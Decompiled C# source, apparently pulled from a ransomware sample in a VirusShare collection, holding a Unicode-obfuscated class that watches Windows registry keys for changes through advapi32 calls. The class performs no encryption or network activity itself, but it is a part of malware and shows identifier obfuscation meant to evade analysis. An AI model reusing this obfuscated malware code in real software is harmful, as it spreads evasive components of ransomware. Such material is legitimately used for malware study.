// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.ᄧథ๠ะ௙࣊प̄Ĵ᫶ᄕᗝ᜕᩽ȵ᛭
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  public class ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED : IDisposable
  {
    private const int \u0B81ŭ\u1B7F\u0C7A᷂͏\u0607 = 1;
    private const int \u1A1A٦\u0FE1ْጛ = 16;
    private const int \u0D44ͱঈআ᪑ᐼ\u1AFD\u1A8Aॊנᣥֽᢓɼۄ = 131072;
    private static readonly IntPtr ᗅᗁฯषᤚଆ\u1809արߚᔢଂዯ\u055DᖟҌ\u1377\u1B4Cၰ = new IntPtr(int.MinValue);
    private static readonly IntPtr \u0F48Ể\u09B1ނਙ့ᝢᖟዔ\u1805\u09FBΊ = new IntPtr(-2147483647);
    private static readonly IntPtr \u1BB3\u0FE0ᥟᝣৣᰆȽધЧЅ\u12B7Ṛ\u0FFBޛϬཱྀᑙ = new IntPtr(-2147483646);
    private static readonly IntPtr \u1C86ᅌᕻ\u0E5EᙃఐڭṞࣣዤɪᇌ\u0CBB = new IntPtr(-2147483645);
    private static readonly IntPtr ᆘხᙻᒽ\u1B7F౨ঔẆำסଠ᪼ᘹ\u0868ᥝ\u089B\u1375\u061D = new IntPtr(-2147483644);
    private static readonly IntPtr ٿ\u0CB4ᅾϘ\u0D55ᣝ\u0D4FႶૅጣ\u0E98\u083CᆛᚊᓘೂṌၟ\u0E6F = new IntPtr(-2147483643);
    private static readonly IntPtr \u07F0߱ᵀ̙ྙ̽\u1AC7ᔖᶄԀGẮᮌፐ = new IntPtr(-2147483642);
    private IntPtr \u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ;
    private string ᇞ\u037EᇴহᚕᎵʞ৯ࠋ;
    private object \u0970\u1CC4ޭƶჴᣖṏᴊᗶ\u0881ᡊះྰჵ᩹ጣᰲ = new object();
    private Thread ङ၂ᆶഊ\u098Eᒬᰕ૦Ɗ\u005Eۀ;
    private bool \u0FD2ᬕૐᓁɿÇ;
    private ManualResetEvent ʷ\u1AF3ហࠪᓅ\u0E5Bλဗᥖ = new ManualResetEvent(false);
    private ᙉሲ\u17EFᱵ\u0CF7ᨮ\u0E76ᦲં\u197B\u1289Ⴙ࠘ᰰᷯדҕʾ\u1717 ÿ\u0E7FͱᛂᎡÕᜈ߲ᮦጵቀӡ\u060Eᝋ = ᙉሲ\u17EFᱵ\u0CF7ᨮ\u0E76ᦲં\u197B\u1289Ⴙ࠘ᰰᷯדҕʾ\u1717.ᄞ͏ు᭱ᨿ | ᙉሲ\u17EFᱵ\u0CF7ᨮ\u0E76ᦲં\u197B\u1289Ⴙ࠘ᰰᷯדҕʾ\u1717.\u0CCEؘ\u0CD1ᖡᴖᓥTॹᶻ\u1B68ଌዢ\u0C5Fᠠ | ᙉሲ\u17EFᱵ\u0CF7ᨮ\u0E76ᦲં\u197B\u1289Ⴙ࠘ᰰᷯדҕʾ\u1717.ᐍᠮ\u1C87ėཛྷ\u0EEFଂ\u1CF7ൢඪȢึᛀ | ᙉሲ\u17EFᱵ\u0CF7ᨮ\u0E76ᦲં\u197B\u1289Ⴙ࠘ᰰᷯדҕʾ\u1717.ዺױᮽȵ\u192Fൠ\u085Dೠᐡᮤ᳤;

    public ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED(RegistryKey registryKey) => this.\u0C7Eඈ້ฮ\u0834ዏ߮ۢ\u0D49ᆕҡ\u0FBDᕴʿᝐ\u0E93(registryKey.Name);

    public ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED(string name)
    {
      switch (name)
      {
        case "":
        case null:
          throw new ArgumentNullException(nameof (name));
        default:
          this.\u0C7Eඈ້ฮ\u0834ዏ߮ۢ\u0D49ᆕҡ\u0FBDᕴʿᝐ\u0E93(name);
          break;
      }
    }

    public ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED(
      RegistryHive registryHive,
      string subKey)
    {
      this.ᚊ\u0E6Eրᇐἣᴸ(registryHive, subKey);
    }

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyEx", SetLastError = true)]
    private static extern int \u0E74ᓕᜒ\u005B\u1AD4ᤖᣙࠎБྜྷѢࡋါ\u0A7C(
      IntPtr _param0,
      string _param1,
      uint _param2,
      int _param3,
      out IntPtr _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegNotifyChangeKeyValue", SetLastError = true)]
    private static extern int ፚᵄ\u1AC6ḻ\u02E5\u1718ỷẴᄓٶሐΨ(
      IntPtr _param0,
      bool _param1,
      ᙉሲ\u17EFᱵ\u0CF7ᨮ\u0E76ᦲં\u197B\u1289Ⴙ࠘ᰰᷯדҕʾ\u1717 ᝍ٥ّᭀৰߎᛍԺᣲྫྷᤍ२ൡᶍɳਫᎧऑ,
      IntPtr _param3,
      bool _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegCloseKey", SetLastError = true)]
    private static extern int ႧᱩвܬᚍۀỶѻ͂ӣ(IntPtr _param0);

    public event EventHandler RegChanged;

    protected virtual void OnRegChanged()
    {
      EventHandler eventHandler = this.\u106A\u0019കदᬠฯ\u1AF2;
      if (eventHandler == null)
        return;
      eventHandler((object) this, (EventArgs) null);
    }

    public event ErrorEventHandler Error;

    protected virtual void OnError(Exception _param1)
    {
    }

    public void Dispose()
    {
      this.λ\u0C7AYຍӏֶ();
      this.\u0FD2ᬕૐᓁɿÇ = true;
      GC.SuppressFinalize((object) this);
    }

    public ᙉሲ\u17EFᱵ\u0CF7ᨮ\u0E76ᦲં\u197B\u1289Ⴙ࠘ᰰᷯדҕʾ\u1717 \u0F0E\u055C\u0C74ᑉᇛЃ\u0B29ᬪ\u0BDA\u0DC9
    {
      get => this.ÿ\u0E7FͱᛂᎡÕᜈ߲ᮦጵቀӡ\u060Eᝋ;
      set
      {
        lock (this.\u0970\u1CC4ޭƶჴᣖṏᴊᗶ\u0881ᡊះྰჵ᩹ጣᰲ)
        {
          if (this.ـ\u0ADEݒᇮᶴᏺᣑईԃᮿ)
            throw new InvalidOperationException("Monitoring thread is already running");
          this.ÿ\u0E7FͱᛂᎡÕᜈ߲ᮦጵቀӡ\u060Eᝋ = value;
        }
      }
    }

    private void ᚊ\u0E6Eրᇐἣᴸ(RegistryHive _param1, string _param2)
    {
      switch (_param1)
      {
        case RegistryHive.ClassesRoot:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.ᗅᗁฯषᤚଆ\u1809արߚᔢଂዯ\u055DᖟҌ\u1377\u1B4Cၰ;
          break;
        case RegistryHive.CurrentUser:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u0F48Ể\u09B1ނਙ့ᝢᖟዔ\u1805\u09FBΊ;
          break;
        case RegistryHive.LocalMachine:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u1BB3\u0FE0ᥟᝣৣᰆȽધЧЅ\u12B7Ṛ\u0FFBޛϬཱྀᑙ;
          break;
        case RegistryHive.Users:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u1C86ᅌᕻ\u0E5EᙃఐڭṞࣣዤɪᇌ\u0CBB;
          break;
        case RegistryHive.PerformanceData:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.ᆘხᙻᒽ\u1B7F౨ঔẆำסଠ᪼ᘹ\u0868ᥝ\u089B\u1375\u061D;
          break;
        case RegistryHive.CurrentConfig:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.ٿ\u0CB4ᅾϘ\u0D55ᣝ\u0D4FႶૅጣ\u0E98\u083CᆛᚊᓘೂṌၟ\u0E6F;
          break;
        case RegistryHive.DynData:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u07F0߱ᵀ̙ྙ̽\u1AC7ᔖᶄԀGẮᮌፐ;
          break;
        default:
          throw new InvalidEnumArgumentException("hive", (int) _param1, typeof (RegistryHive));
      }
      this.ᇞ\u037EᇴহᚕᎵʞ৯ࠋ = _param2;
    }

    private void \u0C7Eඈ້ฮ\u0834ዏ߮ۢ\u0D49ᆕҡ\u0FBDᕴʿᝐ\u0E93(string _param1)
    {
      string[] strArray = _param1.Split('\\');
      switch (strArray[0])
      {
        case "HKEY_CLASSES_ROOT":
        case "HKCR":
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.ᗅᗁฯषᤚଆ\u1809արߚᔢଂዯ\u055DᖟҌ\u1377\u1B4Cၰ;
          break;
        case "HKEY_CURRENT_USER":
        case "HKCU":
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u0F48Ể\u09B1ނਙ့ᝢᖟዔ\u1805\u09FBΊ;
          break;
        case "HKEY_LOCAL_MACHINE":
        case "HKLM":
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u1BB3\u0FE0ᥟᝣৣᰆȽધЧЅ\u12B7Ṛ\u0FFBޛϬཱྀᑙ;
          break;
        case "HKEY_USERS":
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u1C86ᅌᕻ\u0E5EᙃఐڭṞࣣዤɪᇌ\u0CBB;
          break;
        case "HKEY_CURRENT_CONFIG":
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.ٿ\u0CB4ᅾϘ\u0D55ᣝ\u0D4FႶૅጣ\u0E98\u083CᆛᚊᓘೂṌၟ\u0E6F;
          break;
        default:
          this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ = IntPtr.Zero;
          throw new ArgumentException("The registry hive '" + strArray[0] + "' is not supported", "value");
      }
      this.ᇞ\u037EᇴহᚕᎵʞ৯ࠋ = string.Join("\\", strArray, 1, strArray.Length - 1);
    }

    public bool ـ\u0ADEݒᇮᶴᏺᣑईԃᮿ => this.ङ၂ᆶഊ\u098Eᒬᰕ૦Ɗ\u005Eۀ != null;

    public void لၨ\u1737ᨽऊᓚਿ\u18FCؐ\u070E()
    {
      if (this.\u0FD2ᬕૐᓁɿÇ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.\u0970\u1CC4ޭƶჴᣖṏᴊᗶ\u0881ᡊះྰჵ᩹ጣᰲ)
      {
        if (this.ـ\u0ADEݒᇮᶴᏺᣑईԃᮿ)
          return;
        this.ʷ\u1AF3ហࠪᓅ\u0E5Bλဗᥖ.Reset();
        this.ङ၂ᆶഊ\u098Eᒬᰕ૦Ɗ\u005Eۀ = new Thread(new ThreadStart(this.\u06E8ሢΟ\u0881ØщỾᰔቩख\u0027ᗰᵩᔥỽᴞöጊ\u0FC9));
        this.ङ၂ᆶഊ\u098Eᒬᰕ૦Ɗ\u005Eۀ.IsBackground = true;
        this.ङ၂ᆶഊ\u098Eᒬᰕ૦Ɗ\u005Eۀ.Start();
      }
    }

    public void λ\u0C7AYຍӏֶ()
    {
      if (this.\u0FD2ᬕૐᓁɿÇ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.\u0970\u1CC4ޭƶჴᣖṏᴊᗶ\u0881ᡊះྰჵ᩹ጣᰲ)
      {
        Thread ङ၂ᆶഊᒬᰕ૦Ɗۀ = this.ङ၂ᆶഊ\u098Eᒬᰕ૦Ɗ\u005Eۀ;
        if (ङ၂ᆶഊᒬᰕ૦Ɗۀ == null)
          return;
        this.ʷ\u1AF3ហࠪᓅ\u0E5Bλဗᥖ.Set();
        ङ၂ᆶഊᒬᰕ૦Ɗۀ.Join();
      }
    }

    private void \u06E8ሢΟ\u0881ØщỾᰔቩख\u0027ᗰᵩᔥỽᴞöጊ\u0FC9()
    {
      try
      {
        this.\u1B63ඉٻဧޘओᔏడ҃ഐୂñ\u1ABE\u1737Ỏ\u1AC4();
      }
      catch (Exception ex)
      {
        this.OnError(ex);
      }
      this.ङ၂ᆶഊ\u098Eᒬᰕ૦Ɗ\u005Eۀ = (Thread) null;
    }

    private void \u1B63ඉٻဧޘओᔏడ҃ഐୂñ\u1ABE\u1737Ỏ\u1AC4()
    {
      IntPtr num;
      int error1 = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.\u0E74ᓕᜒ\u005B\u1AD4ᤖᣙࠎБྜྷѢࡋါ\u0A7C(this.\u05C4ዛ\u0F2A௯ᶋ\u104EѮನᄷܹ\u128Fԑఽ, this.ᇞ\u037EᇴহᚕᎵʞ৯ࠋ, 0U, 131089, out num);
      if (error1 != 0)
        throw new Win32Exception(error1);
      try
      {
        AutoResetEvent autoResetEvent = new AutoResetEvent(false);
        WaitHandle[] waitHandles = new WaitHandle[2]
        {
          (WaitHandle) autoResetEvent,
          (WaitHandle) this.ʷ\u1AF3ហࠪᓅ\u0E5Bλဗᥖ
        };
        while (!this.ʷ\u1AF3ហࠪᓅ\u0E5Bλဗᥖ.WaitOne(0, true))
        {
          int error2 = ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.ፚᵄ\u1AC6ḻ\u02E5\u1718ỷẴᄓٶሐΨ(num, true, this.ÿ\u0E7FͱᛂᎡÕᜈ߲ᮦጵቀӡ\u060Eᝋ, autoResetEvent.SafeWaitHandle.DangerousGetHandle(), true);
          if (error2 != 0)
            throw new Win32Exception(error2);
          if (WaitHandle.WaitAny(waitHandles) == 0)
            this.OnRegChanged();
        }
      }
      finally
      {
        if (num != IntPtr.Zero)
          ᄧథ\u0E60ะ\u0BD9\u08CAप̄Ĵ\u1AF6ᄕᗝ\u1715\u1A7Dȵ\u16ED.ႧᱩвܬᚍۀỶѻ͂ӣ(num);
      }
    }
  }
}
